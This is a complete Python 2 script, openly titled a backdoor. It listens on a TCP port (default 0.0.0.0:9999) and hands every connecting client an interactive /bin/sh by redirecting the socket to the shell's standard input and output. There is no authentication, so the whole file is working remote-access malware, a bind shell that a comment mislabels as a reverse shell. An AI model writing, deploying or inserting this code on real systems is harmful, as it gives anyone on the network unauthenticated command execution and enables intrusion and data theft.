#!/usr/bin/env python

# backdoor.py - A simple backdoor written in python

import sys
import os
import socket
import getopt
import threading
import subprocess


def usage():
    print "Usage Information"
    sys.exit(0)


def main():
    # Parse command line arguments
    opts = []
    interface = "0.0.0.0"
    port = 9999
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hi:p:", ["interface", "port"])

    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-i", "--interface"):
            interface = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            print "Unknown options: " + o
            usage()

    server_loop(interface, port)


def server_loop(interface, port):
    # Setup server socket and bind to address
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        server.bind((interface, port))
    except Exception as e:
        print "Failed to bind to: %s:%d" % (interface, port)
        print str(e)
        sys.exit(1)

    server.listen(5)
    print "Listening for connections on: %s:%d" % (interface, port)

    try:
        while True:
            # Wait for client connection
            client_socket, client_address = server.accept()
            client_thread = threading.Thread(target=client_handler, args=(client_socket,))
            client_thread.start()

    except Exception as e:
        print "Exception occurred, exiting.."
        print str(e)
        sys.exit(1)

    except KeyboardInterrupt:
        print "User fired keyboard interrupt, exiting.."
        sys.exit(0)


def client_handler(client_socket):
    # Setup a reverse shell for client socket
    os.dup2(client_socket.fileno(), 0)
    os.dup2(client_socket.fileno(), 1)
    os.dup2(client_socket.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])


if __name__ == "__main__":
    main()
